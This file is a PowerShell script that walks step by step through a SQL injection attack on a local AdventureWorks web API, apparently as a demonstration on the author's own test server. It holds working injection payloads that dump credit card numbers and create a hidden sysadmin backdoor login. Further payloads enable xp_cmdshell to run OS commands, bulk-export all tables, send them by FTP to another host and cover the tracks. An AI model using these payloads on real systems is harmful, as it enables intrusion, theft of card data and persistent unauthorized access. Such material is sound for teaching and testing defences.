## What happens with a stored procedure
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventureproc/12';



Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventureproc/12; select 1'



Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventureproc/42 OR 1 = 1'


Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventureproc/42'





## And we're off
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventure/1'


## Hmmm.... what if I call it with a number of my own
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventure/25'


## can we pass anything at all?
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventure/silly'


## How about?
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventure/4;select silly'






## let's see what's possible
Invoke-RestMethod -Method 'Get' -Uri 'http://localhost:8081/adventure/1 or 1=1'|format-table


## Can we get more?
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) union all Select null, null, null, null, @@Servername+'.'+db_name(), null, null --"


## Time for some real info
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) 
  union select IS_SRVROLEMEMBER('diskadmin', system_user) , 
               IS_SRVROLEMEMBER('securityadmin', system_user), 
               IS_SRVROLEMEMBER('sysadmin', system_user), 
               IS_SRVROLEMEMBER('serveradmin', system_user),
               'server '+@@ServerName+'-'+system_user+' '+current_user,null,null
  union select IS_MEMBER('db_owner') , 
               IS_MEMBER('db_securityadmin'), 
               IS_MEMBER('db_accessadmin'), 
               IS_MEMBER('db_ddladmin'),
               'Database ='+db_name()+' '+system_user+' '+current_user,null,null
               -- "




(Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2)
   union 
     select 1,principal_id,schema_id,
     object_id,object_schema_name(object_id)+'.'+name,
     null,modify_date from sys.tables --").GetEnumerator() |
 select @{Name="Object_id"; Expression = {$_.TerritoryID}},
        @{Name="Table"; Expression = {$_.AccountNumber}},
        @{Name="Modify_date"; Expression = {$_.ModifiedDate}},
        @{Name="Schema_id"; Expression = {$_.StoreID}},
        @{Name="Principal_id"; Expression = {$_.PersonID}}|
         format-table




## search for credit card
(Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2 )
   union 
    select 
      column_id,system_type_id,max_length,object_id,
      Object_Schema_Name(object_id)+ '.'+Object_Name(object_id)+ '.'+ name,
      null,null
    FROM sys.columns 
      WHERE name LIKE '%25card%25' 
        OR Object_Name(object_id) LIKE '%25card%25'--").GetEnumerator() |
 select @{Name="Object_id"; Expression = {$_.TerritoryID}},
        @{Name="column"; Expression = {$_.AccountNumber}},
        @{Name="System_Type_id"; Expression = {$_.PersonID}},
        @{Name="Max_Length"; Expression = {$_.StoreID}},
        @{Name="Column_id"; Expression = {$_.customerID}}|
         format-table


 ## can we get it all?        
(Invoke-RestMethod -Method 'Get' -Uri "
    http://localhost:8081/adventure/1 and 1=2) 
    union select 
           creditcardid,expmonth,expyear,1,'('+cardtype+') '
           +cardnumber,null,modifiedDate 
           FROM sales.creditcard --").GetEnumerator() |
 select @{Name="Provider and card"; Expression = {$_.AccountNumber}},
        @{Name="ExpiryMonth"; Expression = {$_.PersonID}},
        @{Name="ExpiryYear"; Expression = {$_.StoreID}},
        @{Name="CreditCard_id"; Expression = {$_.customerID}}|
         format-table




(Invoke-RestMethod -Method 'Get' -Uri "
    http://localhost:8081/adventure/1 and 1=2) 
    union all Select null, null, null, null,
    CASE SERVERPROPERTY('IsIntegratedSecurityOnly') 
       WHEN 0 THEN 'Mixed Authentication' 
       WHEN 1 THEN 'Windows Authentication' 
    END, null, null --").GetEnumerator() |
select @{Name="Authentication mode"; Expression = {$_.AccountNumber}}




## let's create a backdoor
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
    CREATE LOGIN MSSecurityMtr WITH PASSWORD = 'DtctTn2L2TXqfuqb';
    EXEC master..sp_addsrvrolemember @loginame = N'MSSecurityMtr', @rolename = N'sysadmin' --"






## test it
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
EXECUTE AS LOGIN='MSSecurityMtr'--"




## now really explore the space
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) union all
SELECT * FROM OPENROWSET(
  'SQLOLEDB', 
  'Server=TESTBED\SQL2017;uid=MSSecurityMtr;pwd=DtctTn2L2TXqfuqb', 
  'select null, null, null, null, null,
  ''3F5AE95E-B87D-4AED-95B4-C3797AFCB74F'', ''2014-09-12T11:15:07.263Z''
  ')--"


## make sure we can do what we want
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
use AdventureWorks2017
execute sp_configure 'show advanced options',1;
reconfigure with override;
execute sp_configure 'Ad Hoc Distributed Queries',1;
reconfigure with override;
--"

Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) union all
SELECT * FROM OPENROWSET(
  'SQLOLEDB', 
  'Server=TESTBED\SQL2017;uid=MSSecurityMtr;pwd=DtctTn2L2TXqfuqb', 
  'select null, null, null, null, null,
  ''3F5AE95E-B87D-4AED-95B4-C3797AFCB74F'', ''2014-09-12T11:15:07.263Z''
  ')--"

## Get control of the OS
 Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
use AdventureWorks2017
execute sp_configure 'show advanced options',1;
reconfigure with override;
execute sp_configure 'xp_cmdshell',1;
reconfigure with override;
--"



Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
DECLARE @directoryListing TABLE (TheORDER int identity,  theLine NVARCHAR(255));
INSERT INTO @directoryListing(theLine) EXECUTE  xp_cmdshell 'dir'
SELECT NULL,NULL,NULL,NULL,TheLine,NULL,NULL FROM @directoryListing
--"
## Fails, so we'll have to break this into two commands



<# Can we create a temporary table? #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
create table #directoryListing (TheORDER int identity,  theLine NVARCHAR(255));
INSERT INTO #directoryListing(theLine) EXECUTE  xp_cmdshell 'dir';--"
<# This gives an error but it isn't server-side #>

<# Ah the Hash sign wasn't escaped. So let's now create the temp table. #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
create table %23directoryListing (TheORDER int identity,  theLine NVARCHAR(255));
INSERT INTO %23directoryListing(theLine) EXECUTE  xp_cmdshell 'dir';
--"


<# ok so far. The pause showed us that the table was filled.
 Now let's scoop up the result and we'll be laughing #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) union all 
SELECT NULL,NULL,NULL,NULL,TheLine,NULL,NULL FROM %23directoryListing--"
<# "Invalid object name '#directoryListing'.". Oh bother, they've implemented
connection pooling at the client end. We'll have to create a permanent table instead
#>


Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
create table MS_Temp267 (TheORDER int identity,  theLine NVARCHAR(255));
INSERT INTO MS_Temp267(theLine) EXECUTE  xp_cmdshell 'dir c:%5C';
INSERT INTO MS_Temp267(theLine) EXECUTE  xp_cmdshell 'net use';
INSERT INTO MS_Temp267(theLine) EXECUTE  xp_cmdshell 'wmic logicaldisk list brief'--;"
<# now we have the table, we can find it the next time we connect to the server 
and do our union trick to return the information. Let's make it look neat. #>
 
(Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2) union all 
SELECT NULL,NULL,NULL,NULL,TheLine,NULL,NULL FROM MS_Temp267;drop table MS_Temp267--").GetEnumerator() |
 select  @{Name="Table"; Expression = {$_.AccountNumber}}|
         format-table
<# note that we dropped that table smartly so it doesn't appear in the metadata any more #>

<# in our case there are no network connections which is a bit diappointing, but 
we console ourselves with the fact that there is a drive D which would take a payload.#>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
EXECUTE  xp_cmdshell 'md D:%5CDataBackups'--"
<# we create a directory that looks beyond suspicion #>
<# now we backup the data in all the tables into that directory, using the login 
that we created #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
EXEC sp_msforeachtable 'xp_cmdshell ''bcp  %3F  out  D:%5CDataBackups%5C%3F.data -n -N -dAdventureworks2017 -UPhilFactor -Pismellofpoo4U -SPhilf01'';'--"
<# that we created #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
Execute xp_cmdshell 'echo open 192.168.1.132%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'echo admin%3E%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'echo megabyte%3E%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'echo prompt%3E%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'echo cd Pentlow%3E%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'echo mput D:%5CDataBackups%5C* %3E%3ED:%5CDataBackups%5Coutput.txt';
Execute xp_cmdshell 'ftp -s:D:%5CDataBackups%5Coutput.txt'--"

<# Let's cover our tracks a bit by resetting config and deleting a directory #>
Invoke-RestMethod -Method 'Get' -Uri "http://localhost:8081/adventure/1 and 1=2);
use AdventureWorks2017
execute sp_configure 'show advanced options',1;
reconfigure with override;
execute sp_configure 'Ad Hoc Distributed Queries',0;
reconfigure with override;
Execute xp_cmdshell 'del D:%5CDataBackups%5C*.* %2FQ'
Execute xp_cmdshell 'rmdir D:%5CDataBackups'
--"

<# well, now we know how to do it, shall we try it in PowerShell now?. Perhaps
 another day. #>

